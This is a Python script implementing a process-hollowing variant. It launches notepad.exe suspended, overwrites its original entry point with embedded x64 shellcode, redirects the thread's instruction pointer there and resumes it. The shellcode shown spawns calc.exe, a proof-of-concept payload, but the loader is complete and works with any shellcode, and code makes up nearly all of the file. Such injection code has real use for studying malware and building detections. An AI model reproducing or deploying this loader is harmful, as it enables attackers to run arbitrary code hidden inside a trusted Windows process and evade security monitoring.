"""
Process Hollowing (variant): Original Entry Point (OEP) Overwriting

Steps:
- create suspended process -> CreateProcessW()
- overwrite OEP/entry_point_va address with shellcode
- redirect/initial Instruction Pointer to point to new entry point

Note: to be honest, I don't know if this could be considered hollowing, but whatever
- as this preserves rest of original PE structure (of suspended process)
"""
import ctypes
from ctypes import wintypes
import msvcrt
import struct


kernel32    = ctypes.WinDLL('kernel32.dll', use_last_error=True)
ntdll       = ctypes.WinDLL('ntdll.dll',    use_last_error=True)


# ----------------------------------
# Payloads - sample(s)
# ----------------------------------

# infinite loop (jmp $)
# payload = b"\xEB\xFE"

# Below shellcode spawns calc.exe (x64)
# - shellcode appended with NOPs (\x90) and infinite loop (\xEB\xFE -> jmp $)
# - given infinite loop, target process will show 'elevated' CPU utilisation (non-zero)
#
# All done to maintain execution of TARGET_PROCESS (eg, notepad.exe)
# - otherwise process will exit/terminate
#
# Upon execution, the following heirachy/tree is viewable (eg Task Manager, etc)
# > cmd.exe -> python.exe -> notepad.exe
# > calc.exe (orphaned process)
#
# No PPID spoofing implemented here

buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31"
buf += b"\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2"
buf += b"\x48\xff\xc2\x48\x83\xec\x28\xff\xd0"

payload = buf +  b"\x90\x90\x90\xEB\xFE"




# ----------------------------------
# CONSTANTS - functions
# ----------------------------------

# specify Target Process to hollow/hijack
TARGET_PROCESS = r"c:\windows\system32\notepad.exe"

# CreateProcessW() - samples
CREATE_NEW_CONSOLE  = 0x10
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04

# CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 

# NtQueryInformationProcess()
STATUS_MASK = 0xFFFFFFFF

# ReadProcessMemory() - parsing PEB
IMAGE_BASE_OFFSET = 0x10

# VirtualAllocEx() / VirtualProtectEx ()
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80


# ----------------------------------
# CONSTANTS - PE file layout
# ----------------------------------

# For ease of parsing PE headers, given known field offsets and values

# ----- DOS e_lfanew offset ----- ptr to start of PE Header
PE_OFFSET                   = 0x3C  # 4 bytes

# ----- PE Signature ----- 
PE_SIGNATURE_SIZE           = 4

# ----- IMAGE_FILE_HEADER ----- 
FILE_HDR_SIZE               = 20

FILE_HDR_MACHINE            = 0x00  # 2 bytes
FILE_HDR_NUM_SECTIONS       = 0x02  # 2 bytes
FILE_HDR_TIMESTAMP          = 0x04  # 4 bytes
FILE_HDR_PTR_SYMBOL_TABLE   = 0x08  # 4 bytes
FILE_HDR_NUM_SYMBOLS        = 0x0C  # 4 bytes
FILE_HDR_SIZE_OF_OPT_HDR    = 0x10  # 2 bytes
FILE_HDR_CHARACTERISTICS    = 0x12  # 2 bytes

# ----- IMAGE_OPTIONAL_HEADER (samples) ----- 
OPT_HDR_MAGIC               = 0x00  # 2 bytes
OPT_HDR_ENTRY_POINT         = 0x10  # 4 bytes, Relative Virtual Address (RVA) of entry point
OPT_HDR_IMAGE_BASE          = 0x18  # 4 bytes 
OPT_HDR_SIZE_OF_IMAGE       = 0x38  # 4 bytes
OPT_HDR_SIZE_OF_HEADERS     = 0x3C  # 4 bytes

# ----- IMAGE_SECTION_HEADER ----- 
SECTION_HEADER_SIZE = 40            # 40 byte header size

SEC_HDR_NAME                = 0x00  # 8 bytes
SEC_HDR_VIRTUAL_SIZE        = 0x08  # 4 bytes
SEC_HDR_VIRTUAL_ADDRESS     = 0x0C  # 4 bytes
SEC_HDR_SIZE_OF_RAW_DATA    = 0x10  # 4 bytes
SEC_HDR_PTR_TO_RAW_DATA     = 0x14  # 4 bytes
SEC_HDR_PTR_TO_RELOC        = 0x18  # 4 bytes
SEC_HDR_LINENO_PTR          = 0x1C  # 4 bytes  
SEC_HDR_RELOC_COUNT         = 0x20  # 2 bytes  
SEC_HDR_LINENO_COUNT        = 0x22  # 2 bytes  
SEC_HDR_CHARACTERISTICS     = 0x24  # 4 bytes

# ----- DATA DIRECTORIES ----- 
DATA_DIRECTORY_SIZE         = 8
NUM_DATA_DIRECTORIES        = 16




# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]

# for querying Process Environment Block
# - PebBaseAddress required for parsing memory of a process
# - 48 bytes in size -> passed in ctypes.sizeof(pbi)

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("ExitStatus",                  ctypes.c_void_p),
    ("PebBaseAddress",              ctypes.c_void_p),
    ("AffinityMask",                ctypes.c_void_p),
    ("BasePriority",                ctypes.c_void_p),
    ("UniqueProcessId",             ctypes.c_void_p),
    ("InheritedFromUniqueProcessId",ctypes.c_void_p),
    ]

# for CONTEXT64 struct
class M128A(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ("Low", ctypes.c_uint64),
        ("High", ctypes.c_int64),
    ]

# Used to store CPU register data, for a given thread
# - struct required to be of specific length/size
# - and registers at specific offsets
# - otherwise, padding required to ensure fields exist on 16-byte boundaries
#
# Function to confirm above, created for this reason
# - debug_cpu_registers()

class CONTEXT64(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        # Home Addresses (48 bytes)
        ("P1Home", ctypes.c_uint64), ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64), ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64), ("P6Home", ctypes.c_uint64),
        
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        
        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD), ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        
        # Padding to force Dr0 to offset 80
        ("Padding", wintypes.DWORD), 
        
        ("Dr0", ctypes.c_uint64), ("Dr1", ctypes.c_uint64), 
        ("Dr2", ctypes.c_uint64), ("Dr3", ctypes.c_uint64), 
        ("Dr6", ctypes.c_uint64), ("Dr7", ctypes.c_uint64),
        
        # Integer Registers (Rax at 128)
        ("Rax", ctypes.c_uint64), ("Rcx", ctypes.c_uint64), 
        ("Rdx", ctypes.c_uint64), ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64), ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64), ("Rdi", ctypes.c_uint64),
        ("R8",  ctypes.c_uint64), ("R9",  ctypes.c_uint64), 
        ("R10", ctypes.c_uint64), ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64), ("R13", ctypes.c_uint64), 
        ("R14", ctypes.c_uint64), ("R15", ctypes.c_uint64), 
        
        # Padding to force Instruction Pointer (RIP) to 264
        ("AlignPadding2", ctypes.c_uint64),
        
        ("Rip", ctypes.c_uint64), 
        
        # Floating point (512 bytes)
        ("FltSave", M128A * 32),
        
        # Vector registers
        # - *n modified to 25 here, no code requirement for below registers
        # - no need to be COMPLETELY accurate here-on
        ("VectorRegister", M128A * 25),
        ("VectorControl", ctypes.c_uint64),

        ("DebugControl", ctypes.c_uint64),
        ("LastBranchToRip", ctypes.c_uint64),
        ("LastBranchFromRip", ctypes.c_uint64),
        ("LastExceptionToRip", ctypes.c_uint64),
        ("LastExceptionFromRip", ctypes.c_uint64),
    ]




# ----------------------------------
# Function Prototypes
# ----------------------------------

# ------------------- kernel32.dll -------------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL


kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL


kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,                    # hThread
    ctypes.POINTER(CONTEXT64),          # lpContext
]
kernel32.GetThreadContext.restype = wintypes.BOOL


kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL


kernel32.ResumeThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.ResumeThread.restype = wintypes.DWORD


kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,            # hThread
    ctypes.POINTER(CONTEXT64),  # *lpContext
]
kernel32.SetThreadContext.restype = wintypes.BOOL


kernel32.VirtualProtectEx.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpAddress
    ctypes.c_size_t,                    # dwSize
    wintypes.DWORD,                     # flNewProtect (see CONSTANTS)
    ctypes.POINTER(wintypes.DWORD),     # [o] lpflOldProtect
]
kernel32.VirtualProtectEx.restype = wintypes.BOOL


kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL


# ------------------- ntdll.dll -------------------
ntdll.NtQueryInformationProcess.argtypes = [
        wintypes.HANDLE,                # ProcessHandle
        ctypes.c_int,                   # ProcessInformationClass
        ctypes.c_void_p,                # [o] ProcessInformation
        ctypes.c_ulong,                 # ProcessInformationLength
        ctypes.POINTER(ctypes.c_ulong), # [o] ReturnLength (opt)
]
ntdll.NtQueryInformationProcess.restype = ctypes.c_long




# ----------------------------------
# Function Definitions
# ----------------------------------


# --------------- PE parser helper functions ---------------

# [DOS Header]
# e_lfanew ->   [PE Signature       - 4 bytes]
#               [File Header        - 20 bytes]
#               [Optional Header    - variable]
#               [Section Table      - no Sections x 40bytes]

def get_pe_header_offset(f: object) -> int:
    f.seek(PE_OFFSET)
    return struct.unpack('<I', f.read(4))[0]

def get_file_header_offset(pe_offset: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE

def get_optional_header_offset(pe_offset: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE

def get_section_table_offset(pe_offset: int, size_of_optional_header: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE + size_of_optional_header

def get_oep_rva(payload_path: str) -> int:
    """ 
    Return the OEP_RVA of the binary, ON-DISK
    - Original Entry Point, Relative Virtual Address
    - ie, AddressOfEntryPoint field, within Optional Header
    - NOT an absolute address -> RELATIVE to the image base

    To get address of entrypoint, IN MEMORY
    - entry_point_va = img_base_addr + oep_rva
    """

    print(f"\n[+] Extracting Original Entry Point, Relative Virtual Address:")
    print(f"    -> Payload: {payload_path}")

    with open(payload_path, 'rb') as f:
        pe_offset = get_pe_header_offset(f)
        opt_hdr_offset = get_optional_header_offset(pe_offset)
        f.seek(opt_hdr_offset + OPT_HDR_ENTRY_POINT)

        oep_rva = struct.unpack('<I', f.read(4))[0]
        print(f"    -> oep_rva: {hex(oep_rva)}")

    return oep_rva




# --------------- Misc helper functions ---------------

def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """

    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")


def pause(warning=False) -> None:
    """ Pause until user key press (any) """

    if warning:
        print("\n\n[!] WARNING: About to execute payload: ResumeThread()")
        print("Press any key to continue...", end='', flush=True)
    else:
        print("\n\nPress any key to continue...", end='', flush=True)

    msvcrt.getch()
    print()


def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


def debug_cpu_registers() -> None:
    """
    CONTEXT64() struct used to hold a snapshot of a thread's processor state
    - here we debug to confirm proper struct size and register offsets
    - if numbers do NOT match expectations, then padding in STRUCT def are REQUIRED
    - due to persistent 0xc000000005 Access Violation errors when calling ResumeThread()
    """
    
    print(f"\n[+] DEBUG: CONTEXT64() struct and CPU register offset info:")
    print(f"    -> Struct size: {ctypes.sizeof(CONTEXT64)} (Expected: 1232)")
    print(f"    -> Dr0 Offset: {CONTEXT64.Dr0.offset} (Expected: 80 or 96)")
    print(f"    -> Rax Offset: {CONTEXT64.Rax.offset} (Expected: 128 or 144)")
    print(f"    -> Rip Offset: {CONTEXT64.Rip.offset} (Expected: 264)")

    pause()


# -----------------------------------------------------------------

def create_process(
    app: str=TARGET_PROCESS,
    flags: int=CREATE_SUSPENDED
) -> tuple[wintypes.HANDLE, wintypes.HANDLE,
           wintypes.DWORD, wintypes.DWORD]:

    """ 
    Create process in SUSPENDED state (default)
    - return HANDLEs and Ids to thread/process
    """

    hdr = "\n >>>>    Creating SUSPENDED Process -> CreateProcessW()    <<<<\n"
    print_hdr(hdr)

    # define args
    lpApplicationName = app
    lpCommandLine = None
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = False
    dwCreationFlags = flags
    lpEnvironment = None
    lpCurrentDirectory = None

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    # spawn process
    try:
        if not kernel32.CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes, 
            lpThreadAttributes, 
            bInheritHandles, 
            dwCreationFlags, 
            lpEnvironment, 
            lpCurrentDirectory, 
            ctypes.byref(lpStartupInfo), 
            ctypes.byref(lpProcessInformation)
        ):
            raise winerr()

        print(f"-> Process created: {lpApplicationName}")
        
        # return handles/Ids to thread and process
        # NOTE: probably don't need to return everything here...
        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        dwThreadId = lpProcessInformation.dwThreadId
        dwProcessId = lpProcessInformation.dwProcessId
        
        return hThread, hProcess, dwThreadId, dwProcessId
        
    except OSError as e:
        raise OSError(f"\n[!] CreateProcessW() Failed, Application: {app}, Error: {e}")




def get_img_base_addr(hProcess: wintypes.HANDLE) -> ctypes.c_void_p:

    """
    Return the ImageBaseAddress (from PEB)
    - this field contains the virtual address in memory, where .exe file loaded
    - functions, variables etc inside program, are all located at specific offsets relative to this address
    - this value is required to navigate process' memory -> read PE header, find entry point etc

    Step 1:
    - call NtQueryInformationProcess() <- PBI struct populated
    
    Step 2:
    - from PBI struct, query PebBaseAddress variable
    - PebBaseAddress is a pointer to where PEB starts in memory
    - at offset 0x10 (from PebBaseAddress), sits ImageBaseAddress
    - read PEB at PebBaseAddress + OFFSET <- ReadProcessMemory()
        
    Glossary
    - PBI, Process Basic Information (struct)
    - PEB, Process Environment Block (struct)
    """

    # ----- Step 1: populate PBI struct -----
    
    print(f"\n[+] Retrieving Process Basic Information: NtQueryInformationProcess()")
    
    pbi = PROCESS_BASIC_INFORMATION()
    pi_len = ctypes.c_ulong()
    ProcessInformationClass = 0 # return ProcessBasicInformation
    
    status = ntdll.NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass, 
        ctypes.byref(pbi),
        ctypes.sizeof(pbi),
        ctypes.byref(pi_len)
    )
    
    if status != 0:
        print(f"[!] Failed to query process info: {hex(status & STATUS_MASK)}")
        raise winerr()
    
    print(f"    -> PBI retrieved...")


    # ----- Step 2: query PebBaseAddress -----

    print(f"\n[+] Parsing PEB to retrieve Image Base Address: ReadProcessMemory()")

    image_base = ctypes.c_void_p()      # buffer to populate

    kernel32.ReadProcessMemory(
        hProcess,
        pbi.PebBaseAddress + IMAGE_BASE_OFFSET, # lpBaseAddress
        ctypes.byref(image_base),               # [o] lpBuffer
        ctypes.sizeof(image_base),
        None
    )

    print(f"    -> img_base_addr: {hex(image_base.value)}")

    return image_base.value




def get_entry_point_va(img_base_addr: int, oep_rva: int) -> int:
    """ Return the Entry Point of the application, IN MEMORY """

    entry_point_va = img_base_addr + oep_rva

    print(f"\n[+] Re-using existing Entry Point at: {hex(entry_point_va)}")
    print(f"    -> entry_point_va = img_base_addr + oep_rva")

    print(f"\n\n[+] NOTE: above memory address \"entry_point_va\", will have the following:\n" + "-"*71)
    print(" -> Payload written to here\n -> Instruction Pointer redirected to here\n")

    return entry_point_va




def  modify_memory_protection(
    hProcess: wintypes.HANDLE,
    lpAddress: wintypes.LPVOID,
    dwSize: int,
    flNewProtect: int=PAGE_EXECUTE_READ
) -> int:

    """
    Modify memory protection settings
    - Default (here): PAGE_EXECUTE_READ (non-writable)

    At execution, actual value determined by how memory being handled, or region being modified
    eg, Classic Hollowing:
    - VirtualAllocEx() -> PAGE_READWRITE (RW)
    
    eg, Overwriting entry point
    - CreateProcessW(TARGET_PROCESS)
    - default for what is being overwritten (eg, RX in a .text section)
    """

    print(f"\n[+] Modifying status of memory protection: VirtualProtectEx()")

    lpflOldProtect = wintypes.DWORD()

    if not kernel32.VirtualProtectEx(
        hProcess,
        lpAddress,
        dwSize,
        flNewProtect,
        ctypes.byref(lpflOldProtect)
    ):
        raise winerr()

    PROTECT_STATUS_MAP = {
        0x1000: "MEM_COMMIT",
        0x2000: "MEM_RESERVE", 
        0x01:   "PAGE_NOACCESS", 
        0x02:   "PAGE_READONLY",
        0x04:   "PAGE_READWRITE",
        0x08:   "PAGE_WRITECOPY",
        0x10:   "PAGE_EXECUTE",
        0x20:   "PAGE_EXECUTE_READ",
        0x40:   "PAGE_EXECUTE_READWRITE",
        0x80:   "PAGE_EXECUTE_WRITECOPY",
    }

    old_val = lpflOldProtect.value
    new_val = flNewProtect
    
    old = PROTECT_STATUS_MAP.get(old_val, f"Unknown Code: ({hex(old_val)})")
    new = PROTECT_STATUS_MAP.get(new_val, f"Unknown Code: ({hex(new_val)})")

    print(f"    -> From: {old} ({hex(old_val)})")
    print(f"    -> To:   {new} ({hex(new_val)})")

    return lpflOldProtect.value




def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
) -> None:

    """ Writes raw payload bytes directly into the target process memory """

    print(f"\n[+] Writing payload: WriteProcessMemory()")
    print(f"    -> Destination Address: {hex(lpBaseAddress)}")
    print(f"    -> Payload Size: {len(payload)} bytes")

    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,     # target/base address
        payload,           # raw byte string (e.g., b"\xfc\x48...")
        len(payload),      # size of payload
        ctypes.byref(n_written)
    ):
        raise winerr()

    print(f"    -> Bytes written: {n_written.value}")




def redirect_to_payload(
        hThread: wintypes.HANDLE,
        entry_point_va: int
) -> None:

    """
    Retrieve CPU-register info for target hThread
    - re-direct Instruction Pointer (Rip) to new entry point
    """

    # ensure CONTEXT64 struct is 16-byte aligned in memory
    # - previous script iterations caused 0xc0000005 Access Violation errors...
    # - here, forcing 16-byte alignment (something something SSE instructions)

    # Below, force CONTEXT64 16-byte boundry alignment
    #
    # Steps:
    # - allocate extra 16 bytes to give wiggle room
    # 
    # at aligned_addr:
    # - move into next boundry (+ 0xF, or 15 decimal)
    # - apply bitmask to zero-out last 4 bits -> 0 (~15, as 15 decimal = 1111 binary)
    # - binary value that ends in 0000 is divisible by 16 -> eg 1011 0000
    
    raw_buffer = ctypes.create_string_buffer(ctypes.sizeof(CONTEXT64) + 16)
    raw_addr = ctypes.addressof(raw_buffer)
    aligned_addr = (raw_addr + 0xF) & ~0xF
    
    # map struct onto above specific memory address
    ctx = CONTEXT64.from_address(aligned_addr)
    ctx.ContextFlags = CONTEXT_ALL # 0x10001f




    # ----- retrieve information on CPU registers -----
    
    print(f"\n[+] Reading current state of CPU-registers for thread: GetThreadContext()")
    if not kernel32.GetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()

    # old v new Rip
    print(f"    -> Original Instruction Pointer: {hex(ctx.Rip)}")
    ctx.Rip = entry_point_va
    print(f"    -> New Instruction Pointer:      {hex(ctx.Rip)}")


    # ----- ensure Stack Pointer (Rsp) is also 16-byte aligned -----
    
    # - additionally, add 'shadow space' (-0x20, or 32 decimal)
    # - this reserves extra space on stack to save and restore register values from function calls
    print(f"\n[+] Adjusting Stack Pointer Alignment:")

    # old v new
    print(f"    -> Old Rsp: {hex(ctx.Rsp)}")
    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x20  # Align and add "Shadow Space"
    print(f"    -> New Rsp (Aligned): {hex(ctx.Rsp)}")


    # apply changes
    print(f"\n[+] Redirecting Instruction Pointer to new entrypoint: SetThreadContext()")
    if not kernel32.SetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()
    print(f"    -> Successful")




def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """ Resume execution of original process/thread """

    print(f"\n[+] Resuming original thread:")
    print(f"    -> ProcessId: {dwProcessId}")
    print(f"    -> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)




##########################################
##### Main functionality starts here #####
##########################################


# show state of CPU registers and struct info
debug_cpu_registers()

# create target process <- return handle/Ids to thread/process
hThread, hProcess, dwThreadId, dwProcessId = create_process()

# return base address, of where target process is loaded
img_base_addr = get_img_base_addr(hProcess)

# calculate various entry points (on disk, in memory)
oep_rva = get_oep_rva(TARGET_PROCESS)
entry_point_va = get_entry_point_va(img_base_addr, oep_rva)

# modify memory protection (-> RWX)
modify_memory_protection(hProcess, entry_point_va, len(payload), PAGE_EXECUTE_READWRITE)

# write payload into allocated memory
write_payload(hProcess, entry_point_va, payload)

# redirect Instruction Pointer to new entrypoint of payload
redirect_to_payload(hThread, entry_point_va)

# confirm execution of payload
pause(warning=True)

# resume execution of original thread/process
resume_orig_process(hThread, dwThreadId, dwProcessId)
